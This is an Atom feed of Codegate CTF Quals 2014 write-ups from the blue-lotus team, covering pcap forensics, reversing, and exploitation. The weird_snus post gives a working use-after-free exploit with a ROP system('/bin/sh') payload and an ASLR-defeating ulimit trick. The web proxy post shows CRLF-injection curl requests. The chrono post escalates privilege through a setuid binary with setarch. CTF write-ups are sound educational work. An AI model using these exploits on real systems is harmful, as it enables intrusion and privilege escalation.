<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: CTF | blue-lotus]]></title>
  <link href="http://www.blue-lotus.net//blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://www.blue-lotus.net//"/>
  <updated>2014-02-25T13:46:00+08:00</updated>
  <id>http://www.blue-lotus.net//</id>
  <author>
    <name><![CDATA[blue-lotus]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 weirdshark writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weirdshark-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-weirdshark-writeup</id>
    <content type="html"><![CDATA[<p>A pcap file is given here for analysis. check type using <code>file</code></p>

<pre><code># file weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7
weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7: pcap-ng capture file - version 1.0
</code></pre>

<p>Open the file using wireshark, but no luck, wireshark reports malformed file format and refuse to open it.</p>

<p>So we need to extract the packets inside manually.</p>

<!-- more -->

<p>Soon I got the file format document <a href="https://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html">here</a>, the file format is really simple, it’s organized in blocks, and according to my comprehension, each block contains a single network frame packet.</p>

<p>According to <code>general block structure</code> section in the pcap document, we can easily get the block type, length, and content.</p>

<p>And as for the packet, there are several levels of network protocol headers, a brief hex view shows that the network traffic are HTTP requests and responses, so the protocol stack should be IP + TCP + HTTP</p>

<pre><code>| 6 + 6 bytes MAC addr + 2 bytes (ethertype 08 00) | 20 bytes IP header | 20 bytes TCP header | HTTP Header + HTTP Body |
</code></pre>

<p>the hard thing here to do manually pcap parse is to assemble TCP packets into byte stream, which require a good understanding of TCP control sequence. But we can assume that the network condition is good, no packet loss or retranssmission happens, just assemble them one by one and see what happens.</p>

<p>use the following python code to extract all http content</p>

<p>```python
import os, sys, struct</p>

<p>f = open(‘weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7’).read()
total = len(f)</p>

<h1 id="skip-the-first-two-blocks-which-seems-broken-0x80-and-0x9c-are-the-block-sizes-respectively">skip the first two blocks, which seems broken, 0x80 and 0x9c are the block sizes respectively</h1>
<p>index = 0x80 + 0x9c</p>

<p>w = open(‘http-content.bin’, ‘w’)</p>

<p>while index &lt; total:
    block_type = f[index:index+4].encode(‘hex’)
    block_size = struct.unpack(‘&lt;I’, f[index+4:index+8])[0]
    captured_len = struct.unpack(‘&lt;I’, f[index+20:index+24])[0]
    packet_len = struct.unpack(‘&lt;I’, f[index+24:index+28])[0]
    print index, block_size, packet_len, captured_len, block_type
    w.write(f[index+28+54:index+28+packet_len])
    w.flush()
    index += block_size</p>

<p>w.close()
```</p>

<p>The result seems very promising,  just concat the packet contents one by one really works! which indicates the network condition is really good. There are several http requests inside</p>

<pre><code>GET / HTTP/1.1
GET /favicon.ico HTTP/1.1
GET /mario.png HTTP/1.1
GET /favicon.ico HTTP/1.1
GET /obama.bmp HTTP/1.1
GET /codegate.jpg HTTP/1.1
GET /multiple.pdf HTTP/1.1
GET /grayhash.jpg HTTP/1.1
</code></pre>

<p>And to my surprise, the flag is not in <code>codegate.jpg</code>, but in <code>multiple.pdf</code></p>

<p>FLAG = <code>FORENSICS_WITH_HAXORS</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 weird_snus writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-weird_snus-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-weird_snus-writeup</id>
    <content type="html"><![CDATA[<h2 id="vulnerabilities">vulnerabilities</h2>
<ol>
  <li>Password protection can be easily bypassed by giving a input of ‘0x00’</li>
  <li>We quickly identified there is a use-after-free bug. After verifying the password, the program runs into an endless command processing mode, where user can input various buffer command to do some strange things. The first letter in each command represents the action to perform. Command A will check if a struct pointer exists, if so, it will call the function pointer in the struct, or it will allocate a new struct. Command D will reallocate the struct can free it later without cleat the struct pointer. So fist calling command D, and then calling command A will trigger a use-after-free crash. If we find somewhere to do the similar size malloc and fill the struct including the function pointer, we could hijack the control of the program.</li>
</ol>

<h2 id="exploitation">Exploitation</h2>

<p>Luckily we found that there is a command M can do arbitrary size allocation. The path of current working directory will be put in the content of the new allocation. So we can construct a directory, whose path contains evil function pointer. Then we trigger the use-after-free bug mentioned above.</p>

<p>To get a shell, we first put a large amount of ROP payload(system(‘/bin/sh’)) in the environment variable,
and then we use an <code>add esp</code> gadget in the libc to raise the stack to the place where environment variables are stored in. <code>ulimit -s unlimited</code> trick is used to get rid of libc address randomization.</p>

<h2 id="code">Code</h2>

<h3 id="important-addresses">important addresses</h3>

<pre><code>system: 0x40079260 
binsh: 0x401a1b98

11817d:       81 c4 8c 22 00 00       add    $0x228c,%esp
0x40079260 - 0x41260 + 0x11817d 0x4015017d   \x7d\x01\x15\x40
</code></pre>

<h3 id="commands">commands</h3>
<p>Disable libc randomization:</p>

<pre><code>ulimit -s unlimited
</code></pre>

<p>Create a directory and cd to it:</p>

<pre><code>python -c 'import os; os.makedirs("/tmp/aaaa/aa\x7d\x01\x15\x40")'
</code></pre>

<p>Set ROP payloads in an environment variable and trigger use-after-free bug. Notice that the python variable <code>o</code> should be adjusted to achieve the stack alignment. The number below is just an example.</p>

<pre><code>export EXPLOIT=$(python -c 'o = 4; print "a" * o + "\x60\x92\x07\x40\x60\x92\x07\x40\x98\x1b\x1a\x40\x98\x1b\x1a\x40" * 2000+"a" * (8 - o)'); (python -c 'print "\x00\nkelwin\nA\nM\nG\x10\x00\x00\x00\nA\n"'; echo "cat /home/strongest_snus/flag"; cat ) | /home/strongest_snus/weird_snus \(
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 Web Proxy writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-web_proxy-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-web_proxy-writeup</id>
    <content type="html"><![CDATA[<p><code>
http://58.229.183.25/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php
</code></p>

<p>Here is a GET param named “url”, we could use it to get some header and body informaiton of a webpage.</p>

<p>and in the index.php’s source code, we can find this:</p>

<pre><code>&lt;!-- admin/index.php --&gt;
</code></pre>

<p>So it’s clear that we will use that GET param “url” to access /admin/index.php</p>

<p>use “localhost” instead of “58.229.183.25”, and find out that a %0a(\n) will make the body information appears in header field, so there maybe some “http response splitting” trick</p>

<p>after several test, we use two step to got the key.</p>

<p>first step:</p>

<pre><code>DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20localhost%0aRange:%20bytes=370-%0a%0a
 &lt;html&gt;
 &lt;head&gt;
      &lt;style type="text/css"&gt;
      body { margin:0; }
      * { font-family:fantasy; }
      p { height:50pt; font-size:50pt; background:green;  }
      input[type=text] { width:500; font-size:15pt; }
      input[type=submit] { width:150; font-size:15pt; }
      input[type=submit]:hover { background:lightblue; }
      table { font-size:15pt; border:0;}
      .err { background:yellow; font-weight:bold; }
      #l:hover{ color:white; font-weight:bold; }
      &lt;/style&gt;
      &lt;title&gt;Web proxy&lt;/title&gt;
 &lt;/head&gt;
 &lt;body bgcolor=gray&gt;&lt;br&gt;
 &lt;p align=center&gt;&lt;u&gt;&lt;a id=l&gt;W&lt;/a&gt;&lt;a id=l&gt;E&lt;/a&gt;&lt;a id=l&gt;B&lt;/a&gt; &lt;a id=l&gt;P&lt;/a&gt;&lt;a id=l&gt;R&lt;/a&gt;&lt;a id=l&gt;O&lt;/a&gt;&lt;a id=l&gt;X&lt;/a&gt;&lt;a id=l&gt;Y&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;
 &lt;center&gt;&lt;form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'&gt;&lt;input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
 Host: localhost
 Range: bytes=370-

 '&gt;&lt;input type=submit value='Submit'&gt;&lt;/form&gt;&lt;/center&gt;&lt;table border=5 align=center cellpadding=10 width=1000&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;&lt;xmp&gt;HTTP/1.1 206 Partial Content
 Date: Sat, 22 Feb 2014 16:11:08 GMT
 Server: Apache/2.4.6 (Ubuntu)
 X-Powered-By: PHP/5.5.3-1ubuntu2.1
 Vary: Accept-Encoding
 Content-Range: bytes 370-429/430
 Content-Length: 60
 Content-Type: text/html&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=left&gt;&lt;td bgcolor=silver&gt;&lt;xmp&gt;

 0
 &lt;!--if($_SERVER[HTTP_HOST]=="hackme")--&gt;&lt;/body&gt;
 .
 .
 .
 .
 .&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
 &lt;!-- admin/index.php --&gt;
 &lt;/body&gt;
 &lt;/html&gt;
</code></pre>

<p>second step:</p>

<pre><code>     DeAdCaT-2:tmp DeAdCaT___$ curl http://58.229.183.24/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php?url=127.0.1.1%2F188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/%20HTTP/1.1%0aHost:%20hackme%0aRange:%20bytes=80-%0a%0a
 &lt;html&gt;
 &lt;head&gt;
      &lt;style type="text/css"&gt;
      body { margin:0; }
      * { font-family:fantasy; }
      p { height:50pt; font-size:50pt; background:green;  }
      input[type=text] { width:500; font-size:15pt; }
      input[type=submit] { width:150; font-size:15pt; }
      input[type=submit]:hover { background:lightblue; }
      table { font-size:15pt; border:0;}
      .err { background:yellow; font-weight:bold; }
      #l:hover{ color:white; font-weight:bold; }
      &lt;/style&gt;
      &lt;title&gt;Web proxy&lt;/title&gt;
 &lt;/head&gt;
 &lt;body bgcolor=gray&gt;&lt;br&gt;
 &lt;p align=center&gt;&lt;u&gt;&lt;a id=l&gt;W&lt;/a&gt;&lt;a id=l&gt;E&lt;/a&gt;&lt;a id=l&gt;B&lt;/a&gt; &lt;a id=l&gt;P&lt;/a&gt;&lt;a id=l&gt;R&lt;/a&gt;&lt;a id=l&gt;O&lt;/a&gt;&lt;a id=l&gt;X&lt;/a&gt;&lt;a id=l&gt;Y&lt;/a&gt;&lt;/u&gt;&lt;/p&gt;
 &lt;center&gt;&lt;form method=get action='/188f6594f694a3ca082f7530b5efc58dedf81b8d/index.php'&gt;&lt;input type=text name=url value='127.0.1.1/188f6594f694a3ca082f7530b5efc58dedf81b8d/admin/ HTTP/1.1
 Host: hackme
 Range: bytes=80-

 '&gt;&lt;input type=submit value='Submit'&gt;&lt;/form&gt;&lt;/center&gt;&lt;table border=5 align=center cellpadding=10 width=1000&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;&lt;xmp&gt;HTTP/1.1 206 Partial Content
 Date: Sat, 22 Feb 2014 15:51:11 GMT
 Server: Apache/2.4.6 (Ubuntu)
 X-Powered-By: PHP/5.5.3-1ubuntu2.1
 Vary: Accept-Encoding
 Content-Range: bytes 80-126/127
 Content-Length: 47
 Content-Type: text/html&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr align=left&gt;&lt;td bgcolor=silver&gt;&lt;xmp&gt;

 word is WH0_IS_SnUS_bI1G_F4N
 &lt;/body&gt;
 .
 .
 .
 .4
 .&lt;/xmp&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
 &lt;!-- admin/index.php --&gt;
 &lt;/body&gt;
 &lt;/html&gt;
</code></pre>

<p>Password is WH0_IS_SnUS_bI1G_F4N</p>

<p>Cheers :)          </p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 Clone Technique writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-clone-technique-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-clone_technique-writeup</id>
    <content type="html"><![CDATA[<p>Clone_Techique is a 250 points reverseme. The given program is a win32 PE. </p>

<p>After load it in IDA pro, we can see the main function contains a loop which calls <code>CreateProcessW</code> many many times, that explains the title “clone technique”. Before <code>CreateProcessW</code>, command string is prepared by <code>wsnprintf</code>, in which add some arguements when create new process. Except that, nothing special in main function.</p>

<pre><code>if ( (unsigned int)count &lt;= 0xD0000000 )
{
    count = v1;
    dword_409754 = v6;
    GetModuleFileNameW(0, &amp;Filename, 0x12Cu);
    do
    {
        if ( (unsigned int)dword_409758 &gt; 0x190 )
        return 0;
        ++dword_409758;
        wsprintfW(&amp;CommandLine, L"\"%s\" %u %u %u", &amp;Filename, v1, v6, dword_409758);
        CreateProcessW(0, &amp;CommandLine, 0, 0, 0, 0, 0, 0, &amp;StartupInfo, &amp;ProcessInformation);
        WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFFu);
        GetExitCodeProcess(ProcessInformation.hProcess, &amp;ExitCode);
        v1 = ExitCode;
        v6 = sub_401280(ExitCode ^ v6, ExitCode % 0x1E);
    }
    while ( ExitCode );
    result = 0;
}
</code></pre>

<p>It took me sometime to figure out where to store the flag. Finally I notice a strange string near the const string used by <code>wsprintfW</code>.</p>

<pre><code>.data:00407030 magic_string    db 0Fh,'帪9=^?▃h',0Ch,'=嫮判{',9,'4叮g],0,0
.data:00407030                                         ; DATA XREF: sub_401160+90o
.data:0040704C ; const WCHAR aSUUU
.data:0040704C aSUUU:                                  ; DATA XREF: real_main+128o
.data:0040704C                 unicode 0, &lt;"%s" %u %u %u&gt;,0
.data:00407068                 align 10h
</code></pre>

<p>Using Xref, IDA lead me to a interesting function. Noticing the <code>GetCommandLineW</code> call and <code>WriteProcessMemory</code> call, I believe it should be the key functin. </p>

<p>But there is some anti-decompile technique disable IDA to decompile this function. </p>

<pre><code>add     esp, 80h
sub     esp, 80h
</code></pre>

<p>By filling the line shown above with nop. The IDA successfully decompile it.</p>

<pre><code>v0 = GetCommandLineW();
v5 = CommandLineToArgvW(v0, &amp;pNumArgs);
if ( pNumArgs == 4 )
{
    Buffer = _wtoi(v5[1]);
    v7 = _wtoi(v5[2]);
    dword_409758 = _wtoi(v5[3]);
}
else
{
    Buffer = 0xA8276BFAu;
    v7 = 0x92F837EDu;
    dword_409758 = 1;
}
memset(sub_401070(&amp;magic_string, Buffer, v7), 0, 28u);
Buffer ^= 0xB72AF098u;
v7 ^= v7 * Buffer;
lpBaseAddress = (char *)&amp;unk_409748 + 4;
WriteProcessMemory((HANDLE)0xFFFFFFFF, (char *)&amp;unk_409748 + 4, &amp;Buffer, 4u, &amp;NumberOfBytesWritten);
lpBaseAddress = (char *)&amp;unk_409750 + 4;
return WriteProcessMemory((HANDLE)0xFFFFFFFF, (char *)&amp;unk_409750 + 4, &amp;v7, 4u, &amp;NumberOfBytesWritten);
</code></pre>

<p>It is clear that the program compute the magic string with arguments. And then memset the new string with 0 immediately. The new string is very likely to be the flag. But we must know the correct arguements. Next step we need to find out the all the arguements when createprocess</p>

<p>Using procmon, it is easy to monitor all newlly created process and log them. Export them all into XML file, and do some scripting, and then we get all the arguements when create process.</p>

<p><img src="http://www.blue-lotus.net/images/2013/procmon.png" alt="1" /></p>

<p>Now it very close to the flag, but for me the pain just begins. Not familiar with debugging multi-process in windows, I decide to totally reverse the compute function. Luckily, with help of IDA it’s not that diffcult, but still took me some time. </p>

<p>The most frustrating part is the ROL function provided by IDA don’t behave the same with the reverseme. Using a debugger, I set a breakpoint at the key function and compare the results of my own code and that of reverseme. </p>

<p>With a rewritten key function, just enumerate all the parameters we dumped. Look over the 800+ results, we find:</p>

<pre><code>And Now His Watch is Ended
</code></pre>

<p>That’s the flag!</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF Quals 2014 chrono writeup]]></title>
    <link href="http://www.blue-lotus.net//2014-02-25-codegate-ctf-quals-2014-chrono-writeup/"/>
    <updated>2014-02-25T00:00:00+08:00</updated>
    <id>http://www.blue-lotus.net//codegate-ctf-quals-2014-chrono-writeup</id>
    <content type="html"><![CDATA[<p>Description</p>

<pre><code>ssh guest@58.229.183.16 / ExtremelyDangerousGuest
</code></pre>

<p>Login, look around</p>

<pre><code>guest@codegate:~$ ls -al
total 20
dr-xr-x--- 2 guest guest 4096 Feb 19 22:49 .
drwxr-xr-x 4 root  root  4096 Feb 22 00:07 ..
lrwxrwxrwx 1 root  root     9 Feb 19 22:22 .bash_history -&gt; /dev/null
-rw-r--r-- 1 root  root   220 Feb 19 22:21 .bash_logout
-rw-r--r-- 1 guest guest 3637 Mar 31  2013 .bashrc
-rw-r--r-- 1 guest guest  675 Mar 31  2013 .profile

guest@codegate:~$ lsattr -a
----i--------e-- ./.profile
----i--------e-- ./.bash_logout
-------------e-- ./..
----i--------e-- ./.
lsattr: Operation not supported While reading flags on ./.bash_history
----i--------e-- ./.bashrc

guest@codegate:/home/chrono$ ls -al
total 924
dr-xr-xr-x 2 chrono chrono   4096 Feb 19 22:24 .
drwxr-xr-x 4 root   root     4096 Feb 22 00:07 ..
lrwxrwxrwx 1 root   root        9 Feb 19 22:24 .bash_history -&gt; /dev/null
-rw-r--r-- 1 chrono chrono    220 Mar 31  2013 .bash_logout
-rw-r--r-- 1 chrono chrono   3637 Mar 31  2013 .bashrc
-rwsr-xr-x 1 chrono chrono 921576 Feb 19 22:13 chrono
-r-------- 1 chrono chrono     28 Feb 22 00:07 key
-rw-r--r-- 1 chrono chrono    675 Mar 31  2013 .profile

guest@codegate:/home/chrono$ lsattr -a
lsattr: Permission denied While reading flags on ./key
----i--------e-- ./.profile
----i--------e-- ./.bash_logout
-------------e-- ./..
----i--------e-- ./.
lsattr: Operation not supported While reading flags on ./.bash_history
----i--------e-- ./chrono
----i--------e-- ./.bashrc
</code></pre>

<p>Nice security</p>

<pre><code>guest@codegate:/home/chrono$ file chrono
chrono: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=0x8c0628afc74aa0a346020da6d9bbd44bd90709a0, stripped
</code></pre>

<p>Stripped x86_64 binary</p>

<p>To make it readable, feed the remote libc.a and libm.a to Flair, produce signature and apply in IDA</p>

<p>Notice that the timeval struct provided by IDA has wrong size. Both tv_sec and tv_usec should be quad-word</p>

<p>Read, read, read…</p>

<p>The output depends on elapsed milliseconds during select. We have two options:</p>

<ol>
  <li>Solve the equation and controll the timing accurately</li>
  <li>Keep timeout untouched, NaN save the world</li>
</ol>

<p>Read Linux source code <code>fs/select.c</code></p>

<pre><code>SYSCALL_DEFINE5(select, int, n, fd_set __user *, inp, fd_set __user *, outp,
                fd_set __user *, exp, struct timeval __user *, tvp)
{
    struct timespec end_time, *to = NULL;
    struct timeval tv;
    int ret;

    if (tvp) {
        if (copy_from_user(&amp;tv, tvp, sizeof(tv)))
            return -EFAULT;

        to = &amp;end_time;
        if (poll_select_set_timeout(to,
                tv.tv_sec + (tv.tv_usec / USEC_PER_SEC),
                (tv.tv_usec % USEC_PER_SEC) * NSEC_PER_USEC))
            return -EINVAL;
    }

    ret = core_sys_select(n, inp, outp, exp, to);
    ret = poll_select_copy_remaining(&amp;end_time, tvp, 1, ret);

    return ret;
}
</code></pre>

<p>The timeval struct is updated in <code>poll_select_copy_remaining</code></p>

<pre><code>static int poll_select_copy_remaining(struct timespec *end_time, void __user *p,
                                      int timeval, int ret)
{
    struct timespec rts;
    struct timeval rtv;

    if (!p)
        return ret;

    if (current-&gt;personality &amp; STICKY_TIMEOUTS)
        goto sticky;

    ...
    ...

    /*
     * If an application puts its timeval in read-only memory, we
     * don't want the Linux-specific update to the timeval to
     * cause a fault after the select has completed
     * successfully. However, because we're not updating the
     * timeval, we can't restart the system call.
     */

sticky:
    if (ret == -ERESTARTNOHAND)
        ret = -EINTR;
    return ret;
}
</code></pre>

<p>STICKY_TIMEOUTS sounds good. And one more important thing, STICKY_TIMEOUTS bit is not cleared for setuid exec. See Linux source code <code>include/uapi/linux/personality.h</code></p>

<pre><code>/*
 * Security-relevant compatibility flags that must be
 * cleared upon setuid or setgid exec:
 */
#define PER_CLEAR_ON_SETID (READ_IMPLIES_EXEC  | \
                            ADDR_NO_RANDOMIZE  | \
                            ADDR_COMPAT_LAYOUT | \
                            MMAP_PAGE_ZERO)
</code></pre>

<p>So, how to change personality?</p>

<pre><code>guest@codegate:/home/chrono$ setarch --help
Usage: setarch &lt;arch&gt; [options] [program [program arguments]]

Options:
 -h, --help               displays this help text
 -v, --verbose            says what options are being switched on
 -R, --addr-no-randomize  disables randomization of the virtual address space
 -F, --fdpic-funcptrs     makes function pointers point to descriptors
 -Z, --mmap-page-zero     turns on MMAP_PAGE_ZERO
 -L, --addr-compat-layout changes the way virtual memory is allocated
 -X, --read-implies-exec  turns on READ_IMPLIES_EXEC
 -B, --32bit              turns on ADDR_LIMIT_32BIT
 -I, --short-inode        turns on SHORT_INODE
 -S, --whole-seconds      turns on WHOLE_SECONDS
 -T, --sticky-timeouts    turns on STICKY_TIMEOUTS
 -3, --3gb                limits the used address space to a maximum of 3 GB
     --4gb                ignored (for backward compatibility only)
     --uname-2.6          turns on UNAME26

For more information see setarch(8).
</code></pre>

<p>Give it a shot</p>

<pre><code>guest@codegate:/home/chrono$ setarch x86_64 -T ./chrono
cat key

He said :
    import zlib
    zlib.compress(space)



 o
|+|
 !
[ ]




voila!
dIfF3rENT_L3VEL_s4me_aNsW3r
</code></pre>

<p>– EOF –</p>

<pre><code>/*
 * CodeGate 2014 - chrono 300 Point Logical
 *
 * Reverse Engineered by libmaru (libmaru#gmail.com)
 *
 * Build Environment:
 *   Linux codegate 3.11.0-15-generic #25-Ubuntu SMP
 *     Thu Jan 30 17:22:01 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
 *   gcc (Ubuntu/Linaro 4.8.1-10ubuntu9) 4.8.1
 *
 * Build Instruction:
 *   gcc -static -fno-stack-protector -o chrono chrono.c -lm
 *   strip chrono
 *
 * Produce identical binary except Build ID
 *
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdbool.h&gt;
#include &lt;math.h&gt;
#include &lt;sys/select.h&gt;

#define TIMEOUT     299792458
#define PARAM       0.0030000000000000000625L
#define IDEAL_SUM   6.6260690000000002087L
#define PI          3.1415920000000001622L

int main()
{
    long double remain = 0;
    long double param = 0;
    long double item = 0;
    long double sum = 0;
    struct timeval timeout;
    fd_set readfds;
    char buf[256] = {};
    int x,y;
    bool flag = 1;

    timeout.tv_sec  = TIMEOUT / 1000000;
    timeout.tv_usec = TIMEOUT % 1000000;

    FD_ZERO( &amp;readfds );
    FD_SET( 0, &amp;readfds );

    if( select( 1, &amp;readfds, NULL, NULL, &amp;timeout ) &lt;= 0 )
    {
        puts( "no hack." );
        exit( 0 );
    }

    remain = timeout.tv_sec * 1000000 + timeout.tv_usec;
    puts( "\nHe said : \n\timport zlib\n\tzlib.compress(space)" );
    param = ( TIMEOUT - remain ) * PARAM;

    for( y = 10; y &gt;= 0; --y )
    {
        for( x = 0; x &lt;= 45; ++x )
        {
            item = sin( x/param + 4 ) + 5;
            sum += item;

            if( flag &amp;&amp; x &gt; 4 &amp;&amp; x == rint( param * PI ) &amp;&amp; rint( item ) == y-1 )
                flag = 0, putchar('*');
            else if( flag &amp;&amp; x == 45 &amp;&amp; y-1 == rint( item ) )
                putchar('*');
            else if( x &gt; 4 &amp;&amp; x &lt;= 45 &amp;&amp; rint( item ) == y )
                putchar('#');
            else if( x == 1 &amp;&amp; y == 7 )
                putchar('o');
            else if( x == 1 &amp;&amp; y == 6 )
                putchar('+');
            else if( x == 0 &amp;&amp; y == 6 )
                putchar('|');
            else if( x == 2 &amp;&amp; y == 6 )
                putchar('|');
            else if( x == 1 &amp;&amp; y == 5 )
                putchar('!');
            else if( x == 0 &amp;&amp; y == 4 )
                putchar('[');
            else if( x == 2 &amp;&amp; y == 4 )
                putchar(']');
            else
                putchar(' ');
        }
        putchar('\n');
    }

    if( FD_ISSET( 0, &amp;readfds ) )
    {
        fgets( buf, sizeof buf - 1, stdin );
        if( !( sum &gt; IDEAL_SUM ) &amp;&amp; !( sum &lt; IDEAL_SUM ) )
        {
            puts( "voila!" );
            system( buf );
        }
    }

    return 0;
}
</code></pre>
]]></content>
  </entry>
  
</feed>
